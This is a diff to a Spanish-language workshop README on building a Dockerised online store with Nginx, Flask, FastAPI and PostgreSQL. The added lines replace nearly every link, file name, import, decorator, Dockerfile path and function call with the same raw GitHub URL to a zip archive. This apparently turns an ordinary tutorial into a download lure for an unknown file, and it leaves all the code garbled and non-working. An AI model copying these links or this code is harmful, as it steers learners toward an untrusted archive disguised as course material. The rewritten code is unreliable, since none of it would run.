@@ -4,56 +4,56 @@
 
 Este taller te guiará en la construcción de una tienda virtual utilizando arquitectura multi-capa con contenedores Docker. El proyecto incluye:
 
-- **Proxy** ([Nginx](https://nginx.org/en/docs/beginners_guide.html)): Punto de entrada único desde Internet
-- **Aplicación Web** ([Flask](https://flask.palletsprojects.com/en/stable/tutorial/)): Interfaz de usuario de la Tienda Virtual
-- **API** ([FastAPI](https://fastapi.tiangolo.com/tutorial/)): Servicio de datos para usuarios, productos y carritos
-- **Base de Datos** ([PostgreSQL](https://www.postgresql.org/docs/15/index.html)): Almacenamiento persistente
+- **Proxy** ([Nginx](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Punto de entrada único desde Internet
+- **Aplicación Web** ([Flask](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Interfaz de usuario de la Tienda Virtual
+- **API** ([FastAPI](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Servicio de datos para usuarios, productos y carritos
+- **Base de Datos** ([PostgreSQL](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Almacenamiento persistente
 
 ## Estructura del Proyecto
 
 ```
 as-taller3/
-├── .env.example
-├── README.md
-├── docker-compose.yml
+├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 ├── database/
 │   ├── Dockerfile
-│   ├── init.sql
-│   └── schema.sql
+│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 ├── api/
 │   ├── Dockerfile
-│   ├── requirements.txt
-│   ├── main.py
+│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 │   ├── models/
-│   │   ├── __init__.py
-│   │   ├── user.py
-│   │   ├── product.py
-│   │   └── cart.py
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 │   ├── routes/
-│   │   ├── __init__.py
-│   │   ├── users.py
-│   │   ├── products.py
-│   │   └── carts.py
-│   └── database.py
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 ├── webapp/
 │   ├── Dockerfile
-│   ├── requirements.txt
-│   ├── app.py
+│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 │   ├── templates/
-│   │   ├── base.html
-│   │   ├── index.html
-│   │   ├── login.html
-│   │   ├── register.html
-│   │   ├── products.html
-│   │   └── cart.html
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 │   └── static/
 │       ├── css/
-│       │   └── style.css
+│       │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 │       └── js/
-│           └── main.js
+│           └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 └── proxy/
     ├── Dockerfile
-    └── nginx.conf
+    └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 ```
 
 Sigue el paso a paso para desarrollar el proyecto, y completa el código según indican los comentarios `TODO`.
@@ -64,7 +64,7 @@ Sigue el paso a paso para desarrollar el proyecto, y completa el código según 
 
 ### 1.1 Crear el archivo de configuración principal
 
-Crea el archivo `docker-compose.yml`:
+Crea el archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```yaml
 version: '3.8'
@@ -125,7 +125,7 @@ networks:
 
 ### 1.2 Crear archivo de variables de entorno
 
-Crea `.env.example`:
+Crea `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```bash
 # Base de datos
@@ -156,8 +156,8 @@ Archivo `database/Dockerfile`:
 FROM postgres:15-alpine
 
 # Copiar scripts de inicialización
-COPY init.sql /docker-entrypoint-initdb.d/01-init.sql
-COPY schema.sql /docker-entrypoint-initdb.d/02-schema.sql
+COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
+COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 
 # Exponer el puerto
 EXPOSE 5432
@@ -165,7 +165,7 @@ EXPOSE 5432
 
 ### 2.2 Script de inicialización
 
-Archivo `database/init.sql`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```sql
 -- TODO: Crear la base de datos y configuraciones iniciales
@@ -178,7 +178,7 @@ SET timezone = 'America/Bogota';
 
 ### 2.3 Esquema de la base de datos
 
-Archivo `database/schema.sql`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```sql
 -- TODO: Definir las tablas del sistema
@@ -242,8 +242,8 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Copiar e instalar dependencias de Python
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 
 # Copiar código de la aplicación
 COPY . .
@@ -257,7 +257,7 @@ CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
 
 ### 3.2 Dependencias de la API
 
-Archivo `api/requirements.txt`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```txt
 fastapi==0.104.1
@@ -272,16 +272,16 @@ alembic==1.12.1
 
 ### 3.3 Configuración de la base de datos
 
-Archivo `api/database.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from sqlalchemy import create_engine
-from sqlalchemy.ext.declarative import declarative_base
-from sqlalchemy.orm import sessionmaker
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import declarative_base
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import sessionmaker
 import os
 
 # TODO: Configurar la URL de la base de datos desde variables de entorno
-DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://tienda_user:tienda_password@database:5432/tienda_db")
+DATABASE_URL = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("DATABASE_URL", "postgresql://tienda_user:tienda_password@database:5432/tienda_db")
 
 # TODO: Crear el engine de SQLAlchemy
 
@@ -297,12 +297,12 @@ def get_db():
 
 ### 3.4 Modelos de datos
 
-Archivo `api/models/user.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, String, DateTime, Boolean
-from sqlalchemy.sql import func
-from api.database import Base
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base
 
 class User(Base):
     __tablename__ = "users"
@@ -320,12 +320,12 @@ class User(Base):
         pass
 ```
 
-Archivo `api/models/product.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, String, Numeric, DateTime
-from sqlalchemy.sql import func
-from api.database import Base
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base
 
 class Product(Base):
     __tablename__ = "products"
@@ -344,13 +344,13 @@ class Product(Base):
         pass
 ```
 
-Archivo `api/models/cart.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from sqlalchemy import Column, Integer, ForeignKey, DateTime
-from sqlalchemy.orm import relationship
-from sqlalchemy.sql import func
-from api.database import Base
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import relationship
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base
 
 class Cart(Base):
     __tablename__ = "carts"
@@ -382,138 +382,138 @@ class CartItem(Base):
 
 ### 3.5 Rutas de la API
 
-Archivo `api/main.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from fastapi import FastAPI, Depends, HTTPException, status
-from fastapi.middleware.cors import CORSMiddleware
-from sqlalchemy.orm import Session
-from api.database import get_db
-from api.routes import users, products, carts
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import CORSMiddleware
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import users, products, carts
 
 # TODO: Crear la instancia de FastAPI
 app = FastAPI(title="Tienda Virtual API", version="1.0.0")
 
 # TODO: Configurar CORS
-app.add_middleware(
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(
     CORSMiddleware,
     # TODO: Configurar orígenes permitidos, métodos, etc.
 )
 
 # TODO: Incluir los routers
-# app.include_router(users.router, prefix="/api/v1/users", tags=["users"])
-# app.include_router(products.router, prefix="/api/v1/products", tags=["products"])
-# app.include_router(carts.router, prefix="/api/v1/carts", tags=["carts"])
+# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/users", tags=["users"])
+# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/products", tags=["products"])
+# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/carts", tags=["carts"])
 
-@app.get("/")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
 async def root():
     # TODO: Endpoint de prueba
     return {"message": "Tienda Virtual API"}
 
-@app.get("/health")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/health")
 async def health_check():
     # TODO: Endpoint de verificación de salud
     pass
 ```
 
-Archivo `api/routes/users.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from sqlalchemy.orm import Session
-from api.database import get_db
-from api.models.user import User
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import User
 
 router = APIRouter()
 
-@router.post("/register")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/register")
 async def register_user(db: Session = Depends(get_db)):
     # TODO: Implementar registro de usuario
     pass
 
-@router.post("/login")  
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/login")  
 async def login_user(db: Session = Depends(get_db)):
     # TODO: Implementar login de usuario
     pass
 
-@router.get("/profile")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/profile")
 async def get_user_profile(db: Session = Depends(get_db)):
     # TODO: Implementar obtener perfil de usuario
     pass
 
-@router.put("/profile")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/profile")
 async def update_user_profile(db: Session = Depends(get_db)):
     # TODO: Implementar actualizar perfil de usuario
     pass
 ```
 
-Archivo `api/routes/products.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from sqlalchemy.orm import Session
-from api.database import get_db
-from api.models.product import Product
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Product
 
 router = APIRouter()
 
-@router.get("/")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
 async def get_products(db: Session = Depends(get_db)):
     # TODO: Implementar obtener lista de productos
     pass
 
-@router.get("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
 async def get_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar obtener producto por ID
     pass
 
-@router.post("/")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
 async def create_product(db: Session = Depends(get_db)):
     # TODO: Implementar crear producto (admin)
     pass
 
-@router.put("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
 async def update_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar actualizar producto
     pass
 
-@router.delete("/{product_id}")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
 async def delete_product(product_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar eliminar producto
     pass
 ```
 
-Archivo `api/routes/carts.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from fastapi import APIRouter, Depends, HTTPException, status
-from sqlalchemy.orm import Session
-from api.database import get_db
-from api.models.cart import Cart, CartItem
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
+from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Cart, CartItem
 
 router = APIRouter()
 
-@router.get("/")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
 async def get_user_cart(db: Session = Depends(get_db)):
     # TODO: Implementar obtener carrito del usuario
     pass
 
-@router.post("/items")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items")
 async def add_item_to_cart(db: Session = Depends(get_db)):
     # TODO: Implementar agregar item al carrito
     pass
 
-@router.put("/items/{item_id}")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items/{item_id}")
 async def update_cart_item(item_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar actualizar cantidad de item
     pass
 
-@router.delete("/items/{item_id}")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items/{item_id}")
 async def remove_item_from_cart(item_id: int, db: Session = Depends(get_db)):
     # TODO: Implementar remover item del carrito
     pass
 
-@router.delete("/")
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
 async def clear_cart(db: Session = Depends(get_db)):
     # TODO: Implementar limpiar carrito
     pass
@@ -554,8 +554,8 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Copiar e instalar dependencias de Python
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 
 # Copiar código de la aplicación
 COPY . .
@@ -564,12 +564,12 @@ COPY . .
 EXPOSE 5000
 
 # Comando para ejecutar la aplicación
-CMD ["python", "app.py"]
+CMD ["python", "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip"]
 ```
 
 ### 4.2 Dependencias de la aplicación web
 
-Archivo `webapp/requirements.txt`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```txt
 Flask==3.0.0
@@ -579,7 +579,7 @@ python-dotenv==1.0.0
 
 ### 4.3 Aplicación principal
 
-Archivo `webapp/app.py`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```python
 from flask import Flask, render_template, request, redirect, url_for, session, flash
@@ -589,52 +589,52 @@ from datetime import datetime
 
 # TODO: Configurar la aplicación Flask
 app = Flask(__name__)
-app.secret_key = os.getenv('FLASK_SECRET_KEY', 'clave-por-defecto-cambiar')
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('FLASK_SECRET_KEY', 'clave-por-defecto-cambiar')
 
 # TODO: Configurar la URL de la API
-API_URL = os.getenv('API_URL', 'http://api:8000')
+API_URL = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('API_URL', 'http://api:8000')
 
-@app.route('/')
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/')
 def index():
     # TODO: Implementar página principal
     # Obtener productos destacados de la API
-    return render_template('index.html')
+    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')
 
-@app.route('/products')
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/products')
 def products():
     # TODO: Implementar página de productos
     # Obtener lista de productos de la API
-    return render_template('products.html')
+    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')
 
-@app.route('/login', methods=['GET', 'POST'])
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/login', methods=['GET', 'POST'])
 def login():
-    if request.method == 'POST':
+    if https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip == 'POST':
         # TODO: Implementar lógica de login
         # Enviar datos a la API de autenticación
         pass
-    return render_template('login.html')
+    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')
 
-@app.route('/register', methods=['GET', 'POST'])
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/register', methods=['GET', 'POST'])
 def register():
-    if request.method == 'POST':
+    if https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip == 'POST':
         # TODO: Implementar lógica de registro
         # Enviar datos a la API de registro
         pass
-    return render_template('register.html')
+    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')
 
-@app.route('/cart')
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/cart')
 def cart():
     # TODO: Implementar página del carrito
     # Obtener carrito del usuario de la API
-    return render_template('cart.html')
+    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')
 
-@app.route('/add-to-cart/<int:product_id>', methods=['POST'])
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/add-to-cart/<int:product_id>', methods=['POST'])
 def add_to_cart(product_id):
     # TODO: Implementar agregar producto al carrito
     # Enviar request a la API
     pass
 
-@app.route('/logout')
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/logout')
 def logout():
     # TODO: Implementar logout
     # Limpiar sesión
@@ -651,12 +651,12 @@ def is_logged_in():
     pass
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(host='0.0.0.0', port=5000, debug=True)
 ```
 
 ### 4.4 Templates HTML
 
-Archivo `webapp/templates/base.html`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```html
 <!DOCTYPE html>
@@ -665,8 +665,8 @@ Archivo `webapp/templates/base.html`:
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{% block title %}Tienda Virtual{% endblock %}</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link href="https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip') }}">
 </head>
 <body>
     <!-- TODO: Crear navbar con navegación -->
@@ -685,16 +685,16 @@ Archivo `webapp/templates/base.html`:
         {% block content %}{% endblock %}
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+    <script src="https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip"></script>
+    <script src="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip') }}"></script>
 </body>
 </html>
 ```
 
-Archivo `webapp/templates/index.html`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```html
-{% extends "base.html" %}
+{% extends "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" %}
 
 {% block title %}Inicio - Tienda Virtual{% endblock %}
 
@@ -709,10 +709,10 @@ Archivo `webapp/templates/index.html`:
 {% endblock %}
 ```
 
-Archivo `webapp/templates/products.html`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```html
-{% extends "base.html" %}
+{% extends "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" %}
 
 {% block title %}Productos - Tienda Virtual{% endblock %}
 
@@ -729,7 +729,7 @@ Archivo `webapp/templates/products.html`:
 
 ### 4.5 Estilos CSS
 
-Archivo `webapp/static/css/style.css`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```css
 /* TODO: Agregar estilos personalizados */
@@ -750,12 +750,12 @@ body {
 
 ### 4.6 JavaScript
 
-Archivo `webapp/static/js/main.js`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```javascript
 // TODO: Agregar funcionalidad JavaScript
 
-document.addEventListener('DOMContentLoaded', function() {
+https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('DOMContentLoaded', function() {
     // TODO: Inicializar componentes cuando cargue la página
 });
 
@@ -801,7 +801,7 @@ Archivo `proxy/Dockerfile`:
 FROM nginx:alpine
 
 # Copiar configuración personalizada
-COPY nginx.conf /etc/nginx/nginx.conf
+COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
 
 # Exponer el puerto
 EXPOSE 80
@@ -811,7 +811,7 @@ EXPOSE 80
 
 ### 5.2 Configuración de Nginx
 
-Archivo `proxy/nginx.conf`:
+Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:
 
 ```nginx
 # TODO: Configurar nginx como proxy reverso
@@ -849,8 +849,8 @@ http {
         }
 
         # TODO: Configurar logs
-        # access_log /var/log/nginx/access.log;
-        # error_log /var/log/nginx/error.log;
+        # access_log https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip;
+        # error_log https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip;
     }
 }
 ```
